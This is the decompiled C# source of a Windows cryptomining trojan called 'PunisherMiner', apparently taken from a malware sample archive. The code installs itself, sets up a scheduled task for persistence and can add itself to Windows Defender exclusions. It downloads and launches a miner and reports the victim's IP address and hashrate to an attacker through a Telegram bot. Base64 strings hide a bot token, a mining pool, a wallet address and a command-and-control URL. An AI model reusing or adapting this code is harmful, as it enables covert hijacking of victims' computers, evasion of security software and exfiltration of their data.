// Decompiled with JetBrains decompiler
// Type: Program
// Assembly: PunisherMiner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5E38855F-8014-4FAB-90F8-2AFCCACBC0F6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Tasker.gen-a984daf88ca5b95be07c38888abaac8d0f4241cc67b3fc5e8e798a5fed89bc6d.exe

using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

internal class Program : PcInfo
{
  private static Mutex InstanceCheckMutex;

  [DllImport("USER32.DLL", CharSet = CharSet.Unicode)]
  public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

  private static void Main(string[] args)
  {
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
    if (!Program.InstanceCheck())
      Environment.Exit(0);
    Registration registration = new Registration();
    registration.CopyFile();
    if (!Settings.isDebug)
      registration.CreateTask();
    if (Settings.AddToDefenderIgonre)
      registration.AddToDefender();
    Downloader.Download();
    Starter.Start();
    Program.SendNotification().Wait();
    Scanner.Run();
  }

  private static Task<bool> SendNotification()
  {
    Thread.Sleep(TimeSpan.FromSeconds(60.0));
    try
    {
      using (WebClient webClient = new WebClient())
      {
        string str = "Билд: " + Program.GetInfo("Password") + " \nКриптовалюта: " + Program.GetInfo("CryptoType") + "\nIP: " + PcInfo.GetIP() + "\nХешрейт на момент запуска: " + MApi.GetHashrate();
        webClient.DownloadString("http://api.telegram.org/bot" + Program.GetInfo("TelegramToken") + "/sendMessage?chat_id=" + Program.GetInfo("TelegramChatId") + "&text=" + str);
      }
    }
    catch
    {
    }
    return Task.FromResult<bool>(true);
  }

  public static string GetInfo(string ident)
  {
    string str1 = Encoding.Default.GetString(Convert.FromBase64String("[CRYPTOTYPE]"));
    string str2 = Encoding.Default.GetString(Convert.FromBase64String("NTE4NTQ5OTgyMzpBQUdRVFpieVBybGZxc19PaHRvRGFRSUZ5TzlqTnZ3NnBjYw=="));
    string str3 = Encoding.Default.GetString(Convert.FromBase64String("VGVsZWdyYW0gQ2hhdCBJRA=="));
    string str4 = Encoding.Default.GetString(Convert.FromBase64String("ODNVWDllNER4MXpLdUpDd1VBdUhlY1h4Yjl1VlVCNkIxZThDeTdwd0R1dmtBVU1rUkVqVTdyVVl5d1hoVTlIZlltVzVObjkyYzJwdUVRdG1ucTFBdUhBZ1RZOFZHZXY="));
    string str5 = Encoding.Default.GetString(Convert.FromBase64String("dXMtd2VzdC5taW5leG1yLmNvbTo0NDQ0"));
    string str6 = Encoding.Default.GetString(Convert.FromBase64String("MTIz"));
    string str7 = Encoding.Default.GetString(Convert.FromBase64String("aHR0cDovL2h0dHBzOi8vc3RyaXBjbHVibGlzdC5ldS9zaDEyMzQ1Njc4OS9hcGkvZW5kcG9pbnQucGhwLw=="));
    string info = "";
    switch (ident)
    {
      case "Adress":
        info = str6;
        break;
      case "CryptoType":
        info = str1;
        break;
      case "Host":
        info = str7;
        break;
      case "Mail":
        info = str4;
        break;
      case "Password":
        info = str6;
        break;
      case "Pool":
        info = str5;
        break;
      case "TelegramChatId":
        info = str3;
        break;
      case "TelegramToken":
        info = str2;
        break;
    }
    return info;
  }

  private static bool InstanceCheck()
  {
    bool createdNew;
    Program.InstanceCheckMutex = new Mutex(true, "SMILEFACE", out createdNew);
    return createdNew;
  }
}
